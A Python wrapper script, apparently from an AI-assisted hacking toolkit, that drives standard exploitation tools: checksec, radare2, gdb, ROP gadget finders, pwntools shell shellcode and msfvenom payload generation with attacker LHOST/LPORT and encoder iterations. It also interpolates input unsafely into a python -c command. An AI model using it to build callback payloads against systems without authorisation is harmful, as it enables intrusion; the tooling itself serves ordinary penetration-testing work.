#!/usr/bin/env python3
"""Binary Exploitation Tools — pwntools, radare2, gdb, msfvenom, checksec, ropper"""

import subprocess, json, sys, shutil, os
from pathlib import Path
from typing import List, Dict

OUTPUT_DIR = Path("/home/kali/HackWithAI/data/payloads")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def _run(cmd: List[str], timeout: int = 300, capture: bool = True) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"Tool not found: {cmd[0]}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Timeout"}

def _which(tool: str) -> bool: return shutil.which(tool) is not None

# ── Binary Analysis ──────────────────────────────────────────────────────
def checksec(binary: str) -> dict:
    result = _run(["checksec", "--format=json", "--file=" + binary])
    if result["ok"]:
        try: result["parsed"] = json.loads(result["stdout"]).get(binary, {})
        except: pass
    return result

def file_info(binary: str) -> dict:
    return _run(["file", binary])

def strings_extract(binary: str, min_len: int = 8) -> dict:
    return _run(["strings", "-n", str(min_len), binary])

def objdump_disassemble(binary: str) -> dict:
    return _run(["objdump", "-d", binary], timeout=60)

def xxd_dump(binary: str, length: int = 512) -> dict:
    return _run(["xxd", "-l", str(length), binary])

# ── Exploit Development ─────────────────────────────────────────────────
def pwntools_checksec(binary: str) -> dict:
    return _run(["python3", "-c", f"from pwn import *; print(ELF('{binary}').checksec())"])

def ropper_find(binary: str, gadget: str = "", search: str = "") -> dict:
    if gadget:
        return _run(["python3", "-m", "ropper", "--file", binary, "--search", gadget])
    return _run(["python3", "-m", "ropper", "--file", binary, "--all"])

def objdump_ropgadgets(binary: str) -> dict:
    return _run(["ROPgadget", "--binary", binary])

# ── Reverse Engineering ──────────────────────────────────────────────────
def radare2_info(binary: str) -> dict:
    return _run(["radare2", "-q", "-c", "iI", binary])

def radare2_disassemble(binary: str, func: str = "main") -> dict:
    return _run(["radare2", "-q", "-c", f"pdf @{func}", binary])

def gdb_run(binary: str, commands: str = "", args: str = "") -> dict:
    """Run gdb with commands. commands: semicolon-separated gdb commands."""
    cmd = ["gdb", "-q", "-batch", "-ex", commands, "--args", binary]
    if args: cmd[-1:-1] = args.split()
    return _run(cmd, timeout=30)

# ── Payload Generation ───────────────────────────────────────────────────
def msfvenom(payload: str, lhost: str, lport: int, fmt: str = "exe", enc: str = "",
             iterations: int = 1, outfile: str = "") -> dict:
    path = outfile or str(OUTPUT_DIR / f"payload_{lport}.{fmt if fmt != 'raw' else 'bin'}")
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", path]
    if enc: cmd += ["-e", enc, "-i", str(iterations)]
    return _run(cmd)

def msfvenom_list_payloads() -> dict:
    return _run(["msfvenom", "--list", "payloads"])

def msfvenom_list_encoders() -> dict:
    return _run(["msfvenom", "--list", "encoders"])

# ── Shellcode ────────────────────────────────────────────────────────────
def shellcode_generate(target_arch: str = "x64", target_os: str = "linux") -> dict:
    """Generate shellcode snippet using pwntools."""
    code = f"""
from pwn import *
context.arch = '{target_arch}'
context.os = '{target_os}'
sc = asm(shellcraft.sh())
print(sc.hex())
"""
    return _run(["python3", "-c", code])

# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    if cmd == "checksec": print(json.dumps(checksec(sys.argv[2])))
    elif cmd == "msfvenom": print(json.dumps(msfvenom(sys.argv[2], sys.argv[3], int(sys.argv[4]))))
    elif cmd == "shellcode": print(json.dumps(shellcode_generate()))
    elif cmd == "ropper": print(json.dumps(ropper_find(sys.argv[2])))
    else: print("Commands: checksec | msfvenom | shellcode | ropper")
